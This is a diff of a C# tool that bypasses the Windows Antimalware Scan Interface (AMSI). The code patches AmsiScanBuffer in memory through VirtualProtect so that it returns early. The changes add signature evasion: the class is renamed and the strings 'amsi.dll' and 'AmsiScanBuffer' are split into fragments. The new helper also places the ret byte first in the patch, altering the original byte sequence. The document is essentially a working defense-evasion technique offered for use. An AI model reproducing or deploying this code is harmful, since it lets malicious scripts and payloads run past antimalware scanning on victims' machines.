@@ -1,26 +1,32 @@
 ﻿using System;
 using System.Runtime.InteropServices;
 
-public class Amsi
+public class A_S_M_A
 {
-    // https://twitter.com/_xpn_/status/1170852932650262530
-    static byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
-    static byte[] x86 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
+    static byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80 };
 
     public static void Bypass()
     {
         if (is64Bit())
-            PatchAmsi(x64);
-        else
-            PatchAmsi(x86);
+            Patch(x64);
     }
 
-    private static void PatchAmsi(byte[] patch)
+    public static byte[] addByteToArray(byte[] bArray, byte newByte)
+    {
+        byte[] newArray = new byte[bArray.Length + 1];
+        bArray.CopyTo(newArray, 1);
+        newArray[0] = newByte;
+        return newArray;
+    }
+
+    private static void Patch(byte[] _patch)
     {
         try
         {
-            var lib = Win32.LoadLibrary("amsi.dll");
-            var addr = Win32.GetProcAddress(lib, "AmsiScanBuffer");
+            var lib = Win32.LoadLibrary("am"+"si.dll");
+            var addr = Win32.GetProcAddress(lib, "Ams"+"iScanBu"+"ffer");
+
+            byte[] patch = addByteToArray(_patch, 0xC3);
 
             uint oldProtect;
             Win32.VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProtect);
@@ -29,8 +35,8 @@ public class Amsi
         }
         catch (Exception e)
         {
-            Console.WriteLine(" [x] {0}", e.Message);
-            Console.WriteLine(" [x] {0}", e.InnerException);
+            Console.WriteLine(" [-] {0}", e.Message);
+            Console.WriteLine(" [-] {0}", e.InnerException);
         }
     }
 
